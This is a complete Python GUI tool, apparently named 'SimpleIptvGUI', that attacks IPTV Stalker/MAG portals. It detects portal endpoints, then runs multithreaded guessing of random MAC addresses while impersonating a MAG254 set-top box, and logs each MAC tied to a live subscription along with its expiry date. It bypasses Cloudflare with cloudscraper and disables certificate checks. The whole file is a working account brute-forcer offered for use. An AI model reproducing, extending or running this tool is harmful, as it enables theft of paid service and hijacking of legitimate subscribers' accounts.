# tk requests cloudscraper

import os
import datetime
import random
import sys
import time
import re
import subprocess
import threading
import pathlib
import requests
import hashlib
import json
import socket
import logging
import platform
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
from queue import Queue
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

# Suppress SSL warnings for requests
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Set default SSL ciphers for secure connections
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = (
    "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:"
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:"
    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:"
    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:"
    "TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:"
    "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:"
    "TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:"
    "TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:"
    "TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP"
)

# Initialize HTTP session
try:
    import cloudscraper
    sesq = requests.Session()
    session = cloudscraper.create_scraper(sess=sesq)
except:
    session = requests.Session()
logging.captureWarnings(True)

# Initialize global variables
hit_count = 0
checks_per_minute = 0
total_scans = 0  # Track total scans across bots
scan_lock = threading.Lock()  # Lock for thread-safe total_scans updates
seen_macs = set()  # For hit deduplication
base_uri = "/c/"
portal_endpoint = "c/portal.php"
output_file = None
scan_running = False
scan_paused = False
pause_condition = threading.Condition()
threads = []
server_url = ""
use_stalker_c = True  # Control whether stalker portals append /c/
min_days = 0
lock = threading.Lock()

# Predefined MAC prefixes
mac_prefixes = [
    'D4:CF:F9:', '33:44:CF:', '10:27:BE:', 'A0:BB:3E:', '55:93:EA:',
    '04:D6:AA:', '11:33:01:', '00:1C:19:', '1A:00:6A:', '1A:00:FB:',
    '00:A1:79:', '00:1B:79:', '00:2A:01:'
]

# Default MAC prefix
default_mac_prefix = '00:1A:79:'

# List of endpoints and paths for detection
endpoints = [
    "c/portal.php",               # Most common MAG portal
    "portal.php",                 # Common fallback
    "server/load.php",            # Common for stalker portals
    "bs.mag.portal.php",
    "portalcc.php",
    "magLoad.php",
    "portalstb/portal.php",
    "k/portal.php",
    "maglove/portal.php",
    "p/portal.php",
    "magaccess/portal.php",
    "portalmega.php",
    "magportal/portal.php",
    "powerfull/portal.php",
]

paths = [
    "",          # Root
    "/c/",       # Common MAG portal path
    "/portalstb/",       # Portal STB
    "/k/",               # Comet
    "/maglove/",         # Maglove
    "/p/",               # Generic p
    "/magaccess/",       # Magaccess
    "/powerfull/",       # Powerfull
]

# User-agent for requests
user_agent = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

# Headers for portal detection
detect_headers = {
    "User-Agent": user_agent,
    "Accept": "application/json,application/javascript,text/javascript,text/html,*/*",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "Keep-Alive",
}

def clean_portal(portal):
    """Clean the portal input by removing http://, https://, and preserving port."""
    portal = re.sub(r'^https?://', '', portal).rstrip('/')
    return portal

def test_endpoint(portal, endpoint, path=""):
    """Test if an endpoint is valid by sending a GET request."""
    url = f"http://{portal}{path}{endpoint}".rstrip('/')
    try:
        response = session.get(url, headers=detect_headers, timeout=10, verify=False, allow_redirects=True)
        final_url = response.url.lower()
        content_type = response.headers.get("Content-Type", "").lower()
        status_code = response.status_code
        text_snippet = response.text[:500].lower()  # Limit to first 500 chars

        # Stricter false positive filtering
        false_positive_patterns = [
            r'wp-login', r'wp-admin', r'cpanel', r'admin', r'login\.php',
            r'404 not found', r'forbidden', r'sign in to your account',
            r'username.*password', r'401 unauthorized'
        ]
        if any(re.search(pattern, text_snippet, re.IGNORECASE) for pattern in false_positive_patterns):
            return False, ""

        # Check for specific IPTV portal indicators
        portal_patterns = [
            r'"js_config"', r'"handshake"', r'"get_profile"', r'"token"', 
            r'"stalker_portal"', r'"mag"', r'"stb"', r'"account_info"'
        ]
        if status_code in (200, 301, 302, 403):  # Include 403 as some portals use it
            # Check for IPTV-related keywords with regex
            if any(re.search(pattern, text_snippet) for pattern in portal_patterns):
                return True, f"{path}{endpoint}".lstrip('/')
            # Check for relevant content types
            if any(ct in content_type for ct in ["json", "javascript", "text/html"]):
                # Validate JSON structure for JSON responses
                if "json" in content_type:
                    try:
                        json.loads(response.text)
                        return True, f"{path}{endpoint}".lstrip('/')
                    except json.JSONDecodeError:
                        return False, ""
                return True, f"{path}{endpoint}".lstrip('/')
            # Check URL for portal indicators
            if any(keyword in final_url for keyword in ["portal", "stalker", "mag", "stb"]):
                return True, f"{path}{endpoint}".lstrip('/')
            # Fallback: non-empty response with plausible size and portal-like structure
            if len(response.text) > 0 and len(response.text) < 100000:
                if any(re.search(pattern, text_snippet) for pattern in portal_patterns):
                    return True, f"{path}{endpoint}".lstrip('/')
    except requests.RequestException:
        pass
    return False, ""

def detect_endpoints(portal):
    """Detect valid endpoints for the given portal using ThreadPoolExecutor."""
    found_endpoints = set()  # Use set for deduplication
    print("Portal detection in process...")
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(test_endpoint, portal, endpoint, path) 
                   for endpoint in endpoints for path in paths]
        for future in futures:
            result, endpoint = future.result()
            if result and endpoint:
                found_endpoints.add(endpoint)
    # Explicitly check c/portal.php
    result, endpoint = test_endpoint(portal, "portal.php", "/c/")
    if result and endpoint:
        found_endpoints.add(endpoint)
    return sorted(list(found_endpoints))  # Convert back to sorted list for consistent output

# Convert month abbreviation to number
def month_string_to_number(month):
    months = {
        'jan': 1, 'feb': 2, 'mar': 3, 'apr': 4, 'may': 5, 'jun': 6,
        'jul': 7, 'aug': 8, 'sep': 9, 'oct': 10, 'nov': 11, 'dec': 12
    }
    month_short = month.strip()[:3].lower()
    try:
        return months[month_short]
    except:
        raise ValueError('Invalid month')

# Parse expiration date to calculate days remaining
def parse_expiration_date(date_str):
    try:
        month = str(date_str.split(' ')[0])
        day = str(date_str.split(', ')[0].split(' ')[1])
        year = str(date_str.split(', ')[1])
        month_num = str(month_string_to_number(month))
        date_obj = datetime.date(int(year), int(month_num), int(day))
        timestamp = time.mktime(date_obj.timetuple())
        return int((timestamp - time.time()) / 86400)
    except:
        return None

# Generate random MAC address
def generate_mac(prefix=default_mac_prefix):
    try:
        mac = f"{prefix}%02X:%02X:%02X" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
        mac = mac.replace(':100', ':10')
        return mac
    except:
        return f"{prefix}00:00:00"

# Define request headers for handshake
def hea1(macs):
    HEADERA = {
        "User-Agent": user_agent,
        "Referer": f"http://{server_url}{base_uri}",
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cookie": f"mac={macs}; stb_lang=en; timezone=Europe/Paris;",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "Keep-Alive",
        "X-User-Agent": "Model: MAG254; Link: Ethernet",
    }
    return HEADERA

# Define request headers for authenticated requests
def hea2(macs, token):
    HEADERd = {
        "User-Agent": user_agent,
        "Referer": f"http://{server_url}{base_uri}",
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cookie": f"mac={macs}; stb_lang=en; timezone=Europe/Paris;",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "Keep-Alive",
        "X-User-Agent": "Model: MAG254; Link: Ethernet",
        "Authorization": f"Bearer {token}",
    }
    return HEADERd

# Format hit output and check for expiration
def format_hit(mac_address, expiration_date, hit_queue, server_url, total_scans, scan_attempts):
    global hit_count
    try:
        with lock:
            if mac_address in seen_macs:
                return
            seen_macs.add(mac_address)
            hit_data = f"""
Date: {time.strftime('%d-%m-%Y %H:%M:%S')}
Panel: http://{server_url}{base_uri}
Mac: {mac_address}
Valid until: {expiration_date}
------
"""
            print(hit_data)
            hit_queue.put((time.strftime('%d-%m-%Y %H:%M:%S'), f"http://{server_url}{base_uri}", mac_address, expiration_date))
            with open(output_file, 'a+', encoding='utf-8') as file:
                file.write(hit_data + '\n')
            hit_count += 1
    except:
        pass

# Check if server is reachable
def ping_server(server_url):
    try:
        test_url = f"http://{server_url.rstrip('/')}{base_uri}"
        response = session.get(test_url, timeout=5, verify=False)
        if response.status_code < 500:
            return True
    except requests.RequestException:
        pass

    try:
        hostname = re.sub(r'^https?://', '', server_url).split(':')[0].split('/')[0]
        param = '-n' if os.name == 'nt' else '-c'
        result = subprocess.run(
            ['ping', param, '1', '-w', '5000', hostname],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=5
        )
        return result.returncode == 0
    except (subprocess.TimeoutExpired, subprocess.SubprocessError):
        return False

# Main scanning function for each bot
def scan_bot(bot_number, scan_attempts, bot_count, server_url, mac_prefix, status_label, gui, hit_queue):
    global hit_count, checks_per_minute, scan_running, scan_paused, total_scans
    for scan in range(bot_number, scan_attempts, bot_count):
        if not scan_running:
            break
        with pause_condition:
            while scan_paused:
                pause_condition.wait()
        with scan_lock:
            global total_scans
            total_scans += 1
        mac_address = generate_mac(mac_prefix)
        encoded_mac = mac_address.upper().replace(':', '%3A')

        # Define API URLs
        handshake_url = f"http://{server_url}/{portal_endpoint}?type=stb&action=handshake&token&prehash&JsHttpRequest=1-xml"
        profile_url = f"http://{server_url}/{portal_endpoint}?action=get_profile&type=stb&sn=&device_id=&device_id2="
        account_info_url = f"http://{server_url}/{portal_endpoint}?type=account_info&action=get_main_info&JsHttpRequest=1-xml"

        retries = 0
        # Handshake request
        while True:
            try:
                response = session.get(handshake_url, headers=hea1(encoded_mac), timeout=15, verify=False)
                data = str(response.text)
                break
            except:
                retries += 1
                time.sleep(1)
                if retries == 6:
                    break

        if 'token' in data:
            token = data.replace('{"js":{"token":"', '').split('"')[0]
            retries = 0
            # Get profile
            while True:
                try:
                    response = session.get(profile_url, headers=hea2(encoded_mac, token), timeout=15, verify=False)
                    data = str(response.text)
                    parental_password = data.split('parent_password":"')[1].split('","bright')[0]
                    break
                except:
                    retries += 1
                    time.sleep(1)
                    if retries == 6:
                        break

            account_id = "null"
            try:
                account_id = data.split('{"js":{"id":')[1].split(',"name')[0]
            except:
                pass

            if account_id != "null":
                retries = 0
                # Get account info
                while True:
                    try:
                        response = session.get(account_info_url, headers=hea2(encoded_mac, token), timeout=15, verify=False)
                        data = str(response.text)
                        break
                    except:
                        retries += 1
                        time.sleep(1)
                        if retries == 6:
                            break

                if data.count('phone') != 0:
                    raw_expiration = ""
                    if 'end_date' in data:
                        raw_expiration = data.split('end_date":"')[1].split('"')[0]
                    else:
                        try:
                            raw_expiration = data.split('phone":"')[1].split('"')[0]
                        except:
                            pass

                    if raw_expiration:
                        # Remove time indication (e.g., '11:59 am')
                        raw_expiration = re.sub(r'\d{1,2}:\d{2}\s*(?:AM|PM|am|pm)', '', raw_expiration, flags=re.IGNORECASE).strip()

                        expiration_date = raw_expiration
                        days = None
                        if raw_expiration.lower().startswith('un'):
                            days = float('inf')
                            expiration_date = "Unlimited"
                        else:
                            days = parse_expiration_date(raw_expiration)
                            if days is not None:
                                expiration_date = f"{raw_expiration} ({days} Days)"
                            else:
                                try:
                                    date_obj = datetime.datetime.strptime(raw_expiration, '%Y-%m-%d')
                                    days = (date_obj - datetime.datetime.now()).days
                                    expiration_date = f"{raw_expiration} ({days} Days)"
                                except:
                                    pass

                        if days is not None:
                            if days < min_days:
                                print(f"Skipping hit with less than {min_days} days: {mac_address} ({expiration_date})")
                                continue
                        format_hit(mac_address, expiration_date, hit_queue, server_url, total_scans, scan_attempts)

# Tooltip class for input field guidance
class Tooltip:
    def __init__(self, widget, text):
        self.widget = widget
        self.text = text
        self.tip_window = None
        widget.bind("<Enter>", self.show_tip)
        widget.bind("<Leave>", self.hide_tip)

    def show_tip(self, event):
        if self.tip_window or not self.text:
            return
        x = self.widget.winfo_rootx() + 20
        y = self.widget.winfo_rooty() + self.widget.winfo_height() + 5
        self.tip_window = tw = tk.Toplevel(self.widget)
        tw.wm_overrideredirect(True)
        tw.wm_geometry(f"+{x}+{y}")
        label = tk.Label(tw, text=self.text, justify="left", bg="#2E2E2E", fg="white", relief="solid", borderwidth=1, font=("Arial", 10))
        label.pack()

    def hide_tip(self, event):
        if self.tip_window:
            self.tip_window.destroy()
            self.tip_window = None

# Tkinter GUI class
class IptvScannerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("SimpleIptvGUI")
        self.root.geometry("800x900")
        self.root.minsize(600, 700)  # Minimum window size for better scaling
        self.root.resizable(True, True)
        self.root.configure(bg="#1E1E1E")  # Modern dark background

        # Configure style for modern look
        style = ttk.Style()
        style.theme_use("clam")  # Use 'clam' for customizable theme
        style.configure("TButton", font=("Arial", 12), padding=10, background="#3A3A3A", foreground="white")
        style.map("TButton", background=[("active", "#4A4A4A")])
        style.configure("TCombobox", font=("Arial", 12), padding=5)
        style.configure("Treeview", font=("Arial", 11), rowheight=25, background="#2E2E2E", foreground="white", fieldbackground="#2E2E2E")
        style.configure("Treeview.Heading", font=("Arial", 12, "bold"), background="#3A3A3A", foreground="white")
        style.map("Treeview.Heading", background=[("active", "#4A4A4A")])

        # Main frame with padding and dynamic expansion
        main_frame = tk.Frame(self.root, bg="#1E1E1E")
        main_frame.pack(fill="both", padx=20, pady=20, expand=True)

        # Variables
        self.server_url = tk.StringVar(value="")
        self.mac_prefix = tk.StringVar(value="00:1A:79")
        self.scan_attempts = tk.StringVar(value="")
        self.bot_count = tk.StringVar(value="")
        self.min_days = tk.StringVar(value="")
        self.output_file = tk.StringVar(value="")
        self.portal_type = tk.StringVar(value="")
        self.hit_queue = Queue()
        self.current_scan_attempts = 0
        self.found_endpoints = []

        # Input frame with grid layout for responsiveness
        input_frame = tk.Frame(main_frame, bg="#1E1E1E")
        input_frame.pack(fill="x", pady=10)
        input_frame.columnconfigure(1, weight=1)  # Make entry fields expand

        # Input fields with modern styling
        tk.Label(input_frame, text="Portal URL:", font=("Arial", 12, "bold"), bg="#1E1E1E", fg="#FFFFFF").grid(row=0, column=0, padx=10, pady=8, sticky="e")
        self.server_url_entry = tk.Entry(input_frame, textvariable=self.server_url, font=("Arial", 12), bg="#2E2E2E", fg="white", insertbackground="white", relief="flat", borderwidth=2)
        self.server_url_entry.grid(row=0, column=1, padx=10, pady=8, sticky="ew")
        Tooltip(self.server_url_entry, "Enter the IPTV portal URL (e.g., example.com/stalker_portal)")

        tk.Label(input_frame, text="MAC Prefix:", font=("Arial", 12, "bold"), bg="#1E1E1E", fg="#FFFFFF").grid(row=1, column=0, padx=10, pady=8, sticky="e")
        self.mac_prefix_entry = tk.Entry(input_frame, textvariable=self.mac_prefix, font=("Arial", 12), bg="#2E2E2E", fg="white", insertbackground="white", relief="flat", borderwidth=2)
        self.mac_prefix_entry.grid(row=1, column=1, padx=10, pady=8, sticky="ew")
        Tooltip(self.mac_prefix_entry, "Enter MAC prefix in XX:XX:XX format (default: 00:1A:79)")

        tk.Label(input_frame, text="Scan Attempts:", font=("Arial", 12, "bold"), bg="#1E1E1E", fg="#FFFFFF").grid(row=2, column=0, padx=10, pady=8, sticky="e")
        self.scan_attempts_entry = tk.Entry(input_frame, textvariable=self.scan_attempts, font=("Arial", 12), bg="#2E2E2E", fg="white", insertbackground="white", relief="flat", borderwidth=2)
        self.scan_attempts_entry.grid(row=2, column=1, padx=10, pady=8, sticky="ew")
        Tooltip(self.scan_attempts_entry, "Number of MAC addresses to scan (positive integer)")

        tk.Label(input_frame, text="Bot Count:", font=("Arial", 12, "bold"), bg="#1E1E1E", fg="#FFFFFF").grid(row=3, column=0, padx=10, pady=8, sticky="e")
        self.bot_count_entry = tk.Entry(input_frame, textvariable=self.bot_count, font=("Arial", 12), bg="#2E2E2E", fg="white", insertbackground="white", relief="flat", borderwidth=2)
        self.bot_count_entry.grid(row=3, column=1, padx=10, pady=8, sticky="ew")
        Tooltip(self.bot_count_entry, "Number of parallel scan threads")

        tk.Label(input_frame, text="Minimum Days:", font=("Arial", 12, "bold"), bg="#1E1E1E", fg="#FFFFFF").grid(row=4, column=0, padx=10, pady=8, sticky="e")
        self.min_days_entry = tk.Entry(input_frame, textvariable=self.min_days, font=("Arial", 12), bg="#2E2E2E", fg="white", insertbackground="white", relief="flat", borderwidth=2)
        self.min_days_entry.grid(row=4, column=1, padx=10, pady=8, sticky="ew")
        Tooltip(self.min_days_entry, "Minimum days to save hit (default: 1)")

        # Portal detection frame
        portal_frame = tk.Frame(main_frame, bg="#1E1E1E")
        portal_frame.pack(fill="x", pady=10)

        tk.Button(portal_frame, text="Detect Portal", command=self.detect_portal, font=("Arial", 12)).pack(side="left", padx=10)
        tk.Label(portal_frame, text="Portal Type:", font=("Arial", 12, "bold"), bg="#1E1E1E", fg="#FFFFFF").pack(side="left", padx=10)
        self.portal_combobox = ttk.Combobox(portal_frame, textvariable=self.portal_type, state="readonly", font=("Arial", 12), style="TCombobox")
        self.portal_combobox.pack(side="left", padx=10, fill="x", expand=True)
        Tooltip(self.portal_combobox, "Select detected portal type")

        # Output file selection
        button_frame = tk.Frame(main_frame, bg="#1E1E1E")
        button_frame.pack(fill="x", pady=10)
        tk.Button(button_frame, text="Select Output File", command=self.select_output_file, font=("Arial", 12)).pack(pady=5)
        self.output_label = tk.Label(button_frame, textvariable=self.output_file, wraplength=600, font=("Arial", 10), bg="#1E1E1E", fg="#BBBBBB")
        self.output_label.pack(pady=5)

        # Action buttons with modern layout
        action_frame = tk.Frame(main_frame, bg="#1E1E1E")
        action_frame.pack(fill="x", pady=15)
        self.start_button = tk.Button(action_frame, text="Start Scan", command=self.start_scan, font=("Arial", 12), bg="#4CAF50", fg="white", relief="flat", width=12)
        self.start_button.pack(side="left", padx=10)
        self.stop_button = tk.Button(action_frame, text="Stop Scan", command=self.stop_scan, state="disabled", font=("Arial", 12), bg="#F44336", fg="white", relief="flat", width=12)
        self.stop_button.pack(side="left", padx=10)
        self.pause_button = tk.Button(action_frame, text="Pause Scan", command=self.toggle_pause, state="disabled", font=("Arial", 12), bg="#FFC107", fg="white", relief="flat", width=12)
        self.pause_button.pack(side="left", padx=10)

        # Status label with improved visibility
        self.status_label = tk.Label(main_frame, text="Status: Idle", font=("Arial", 12, "bold"), bg="#1E1E1E", fg="#4CAF50", anchor="w")
        self.status_label.pack(fill="x", pady=10)

        # Hits frame with dynamic scaling
        hits_frame = tk.Frame(main_frame, bg="#1E1E1E")
        hits_frame.pack(fill="both", pady=10, expand=True)
        tk.Label(hits_frame, text="Hits:", font=("Arial", 14, "bold"), bg="#1E1E1E", fg="#FFFFFF").pack(anchor="w", pady=5)

        # Treeview for hits with scrollbars
        self.hit_table = ttk.Treeview(hits_frame, columns=("Date", "Portal", "MAC", "Valid Until"), show="headings", style="Treeview")
        self.hit_table.heading("Date", text="Scan Date")
        self.hit_table.heading("Portal", text="Portal URL")
        self.hit_table.heading("MAC", text="MAC Address")
        self.hit_table.heading("Valid Until", text="Valid Until")
        self.hit_table.column("Date", width=150, anchor="center")
        self.hit_table.column("Portal", width=250, anchor="w")
        self.hit_table.column("MAC", width=150, anchor="center")
        self.hit_table.column("Valid Until", width=150, anchor="center")
        self.hit_table.pack(fill="both", padx=5, pady=5, expand=True)

        # Add both vertical and horizontal scrollbars
        v_scrollbar = ttk.Scrollbar(hits_frame, orient="vertical", command=self.hit_table.yview)
        h_scrollbar = ttk.Scrollbar(hits_frame, orient="horizontal", command=self.hit_table.xview)
        self.hit_table.configure(yscrollcommand=v_scrollbar.set, xscrollcommand=h_scrollbar.set)
        v_scrollbar.pack(side="right", fill="y")
        h_scrollbar.pack(side="bottom", fill="x")

        # Start polling for hits
        self.update_hits()

        # Bind resize event for dynamic column scaling
        self.root.bind("<Configure>", self.adjust_column_widths)

    def adjust_column_widths(self, event):
        """Dynamically adjust Treeview column widths based on window size."""
        window_width = self.root.winfo_width()
        total_width = max(600, window_width - 100)  # Ensure minimum width
        self.hit_table.column("Date", width=int(total_width * 0.2))
        self.hit_table.column("Portal", width=int(total_width * 0.4))
        self.hit_table.column("MAC", width=int(total_width * 0.2))
        self.hit_table.column("Valid Until", width=int(total_width * 0.2))

    def show_portal_dialog(self, portal_count, portal_list):
        """Display a custom dialog with scrollable portal types."""
        dialog = tk.Toplevel(self.root)
        dialog.title("Portal Detection")
        dialog.geometry("500x400")
        dialog.minsize(400, 300)
        dialog.configure(bg="#1E1E1E")
        dialog.transient(self.root)  # Set to be on top of main window
        dialog.grab_set()  # Make dialog modal

        # Main frame for dialog
        dialog_frame = tk.Frame(dialog, bg="#1E1E1E")
        dialog_frame.pack(fill="both", padx=20, pady=20, expand=True)

        # Title
        tk.Label(
            dialog_frame,
            text=f"Found {portal_count} Portal Type{'s' if portal_count != 1 else ''}",
            font=("Arial", 14, "bold"),
            bg="#1E1E1E",
            fg="#FFFFFF"
        ).pack(anchor="w", pady=5)

        # Scrollable text area for portal types
        text_frame = tk.Frame(dialog_frame, bg="#1E1E1E")
        text_frame.pack(fill="both", pady=10, expand=True)
        text_area = scrolledtext.ScrolledText(
            text_frame,
            wrap=tk.WORD,
            font=("Arial", 12),
            bg="#2E2E2E",
            fg="white",
            height=10,
            relief="flat",
            borderwidth=2
        )
        text_area.pack(fill="both", expand=True)
        text_area.insert(tk.END, "\n".join([f"- {endpoint}" for endpoint in portal_list]))
        text_area.config(state="disabled")  # Make read-only

        # OK button
        tk.Button(
            dialog_frame,
            text="OK",
            command=dialog.destroy,
            font=("Arial", 12),
            bg="#4CAF50",
            fg="white",
            relief="flat",
            width=10
        ).pack(pady=10)

        # Bind resize event for dynamic scaling
        def adjust_dialog_size(event):
            window_width = max(400, dialog.winfo_width())
            window_height = max(300, dialog.winfo_height())
            text_area.config(width=int(window_width / 10), height=int(window_height / 40))
        
        dialog.bind("<Configure>", adjust_dialog_size)

    def select_output_file(self):
        global output_file
        portal_url = self.server_url.get().strip()
        if not portal_url:
            portal_name = "NoPortal"
        else:
            parsed_url = urlparse(portal_url if portal_url.startswith(('http://', 'https://')) else f'http://{portal_url}')
            portal_name = parsed_url.hostname or "UnknownPortal"
            portal_name = portal_name.split(':')[0]
        portal_name = re.sub(r'[^\w\-_\.]', '_', portal_name)
        current_time = time.strftime("%d-%m-%Y")
        default_filename = f"{portal_name}_SimpleIptv_{current_time}.txt"

        if platform.system() == 'Linux' and os.path.exists('/storage/emulated/0'):
            initial_dir = "/storage/emulated/0/Downloads/"
        else:
            home = os.path.expanduser("~")
            initial_dir = os.path.join(home, "Downloads")
        if not os.path.exists(initial_dir):
            os.makedirs(initial_dir)

        file_path = filedialog.asksaveasfilename(
            initialdir=initial_dir,
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
            initialfile=default_filename
        )
        if file_path:
            self.output_file.set(file_path)
            output_file = file_path

    def detect_portal(self):
        global server_url
        server_url = self.server_url.get().strip()
        if not server_url:
            messagebox.showerror("Error", "Portal URL is required.")
            return

        server_url = clean_portal(server_url)

        self.status_label.config(text="Status: Detecting portal type...")
        self.root.update()  # Force GUI update

        self.found_endpoints = detect_endpoints(server_url)
        if not self.found_endpoints:
            messagebox.showwarning("Warning", "No portal types detected. Defaulting to c/portal.php.")
            self.found_endpoints = ["c/portal.php"]
            self.portal_type.set("c/portal.php")
        else:
            # Display found portal types and count in a custom dialog
            portal_count = len(self.found_endpoints)
            self.show_portal_dialog(portal_count, self.found_endpoints)
            self.portal_combobox['values'] = self.found_endpoints
            self.portal_type.set(self.found_endpoints[0])  # Default to first detected

        self.status_label.config(text="Status: Idle")

    def validate_inputs(self):
        global server_url, default_mac_prefix, base_uri, portal_endpoint, min_days
        server_url = self.server_url.get().strip()
        if not server_url:
            messagebox.showerror("Error", "Portal URL is required.")
            return False

        server_url = clean_portal(server_url)

        mac_prefix = self.mac_prefix.get().strip()
        if mac_prefix and not re.match(r'^[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}$', mac_prefix, re.IGNORECASE):
            messagebox.showerror("Error", "Invalid MAC prefix format. Use XX:XX:XX")
            return False
        default_mac_prefix = mac_prefix.upper() + ':' if mac_prefix else '00:1A:79:'

        try:
            scan_attempts = int(self.scan_attempts.get())
            if scan_attempts <= 0:
                messagebox.showerror("Error", "Scan attempts must be a positive number.")
                return False
        except ValueError:
            messagebox.showerror("Error", "Invalid number for scan attempts.")
            return False

        try:
            bot_count = int(self.bot_count.get())
            if bot_count <= 0:
                messagebox.showerror("Error", "Bot count must be a positive number.")
                return False
        except ValueError:
            messagebox.showerror("Error", "Invalid number for bot count.")
            return False

        try:
            min_days = int(self.min_days.get())
            if min_days < 0:
                messagebox.showerror("Error", "Minimum days must be a non-negative number.")
                return False
        except ValueError:
            messagebox.showerror("Error", "Invalid number for minimum days.")
            return False

        if not output_file:
            messagebox.showerror("Error", "Please select an output file.")
            return False

        # Allow scan to proceed even if no portal is selected
        selected_portal = self.portal_type.get()
        if not selected_portal:
            messagebox.showinfo("Info", "No portal type selected. Defaulting to c/portal.php.")
            selected_portal = "c/portal.php"
            self.portal_type.set("c/portal.php")

        # Set base_uri and portal_endpoint
        if selected_portal.startswith("c/"):
            base_uri = "/c/"
            portal_endpoint = selected_portal
        else:
            # Extract path prefix (e.g., /maglove/) without /c/
            path_prefix = '/'.join(selected_portal.split('/')[:-1]) + '/'
            base_uri = f"/{path_prefix.lstrip('/')}" if path_prefix != '/' else "/c/"
            portal_endpoint = selected_portal

        return True

    def start_scan(self):
        global scan_running, threads, scan_paused, hit_count, seen_macs, total_scans, base_uri, portal_endpoint
        if not self.validate_inputs():
            return

        if not ping_server(server_url):
            messagebox.showerror("Error", "The server seems to be down. Try another one.")
            return

        # Show message if default portal is used
        if not self.found_endpoints or self.portal_type.get() == "c/portal.php":
            messagebox.showinfo("Info", "Starting scan with default portal: c/portal.php")

        # Reset counters for new scan
        hit_count = 0
        seen_macs = set()
        total_scans = 0
        self.current_scan_attempts = int(self.scan_attempts.get())

        scan_running = True
        scan_paused = False
        self.start_button.config(state="disabled")
        self.stop_button.config(state="normal")
        self.pause_button.config(state="normal")
        self.status_label.config(text="Status: Scanning...")

        scan_attempts = self.current_scan_attempts
        bot_count = int(self.bot_count.get())

        threads = []
        for i in range(1, bot_count + 1):
            t = threading.Thread(
                target=scan_bot,
                args=(i, scan_attempts, bot_count, server_url, default_mac_prefix, self.status_label, self, self.hit_queue)
            )
            threads.append(t)
            t.start()

        # Start status polling
        self.update_status()

        # Periodically check if all threads are done
        self.check_threads()

    def toggle_pause(self):
        global scan_paused
        with pause_condition:
            scan_paused = not scan_paused
            self.pause_button.config(text="Resume Scan" if scan_paused else "Pause Scan")
            self.status_label.config(text=f"Status: {'Paused' if scan_paused else 'Scanning'}...")
            if not scan_paused:
                pause_condition.notify_all()

    def check_threads(self):
        global scan_running
        if scan_running and any(t.is_alive() for t in threads):
            self.root.after(100, self.check_threads)
        elif scan_running:
            self.complete_scan()

    def stop_scan(self):
        global scan_running, scan_paused, threads, hit_count, seen_macs, total_scans
        scan_running = False
        scan_paused = False
        with pause_condition:
            pause_condition.notify_all()
        self.start_button.config(state="normal")
        self.stop_button.config(state="disabled")
        self.pause_button.config(state="disabled")
        self.status_label.config(text="Status: Idle")
        self.clear_table()
        for t in threads:
            if t.is_alive():
                t.join()
        session.close()
        # Reset counters after stopping
        hit_count = 0
        seen_macs = set()
        total_scans = 0

    def complete_scan(self):
        global scan_running, scan_paused, hit_count, seen_macs, total_scans
        scan_running = False
        scan_paused = False
        with pause_condition:
            pause_condition.notify_all()
        self.start_button.config(state="normal")
        self.stop_button.config(state="disabled")
        self.pause_button.config(state="disabled")
        self.status_label.config(text="Status: Scan completed")
        self.clear_table()
        session.close()
        # Reset counters after completion
        hit_count = 0
        seen_macs = set()
        total_scans = 0

    def clear_table(self):
        for item in self.hit_table.get_children():
            self.hit_table.delete(item)

    def update_hits(self):
        while not self.hit_queue.empty():
            date, portal, mac, valid = self.hit_queue.get()
            self.hit_table.insert("", tk.END, values=(date, portal, mac, valid))
        self.root.after(100, self.update_hits)

    def update_status(self):
        global total_scans, hit_count, scan_running
        if scan_running:
            self.status_label.config(text=f"Scan: {total_scans}/{self.current_scan_attempts} | Hits: {hit_count}")
            self.root.after(50, self.update_status)

if __name__ == "__main__":
    root = tk.Tk()
    app = IptvScannerGUI(root)
    root.mainloop()
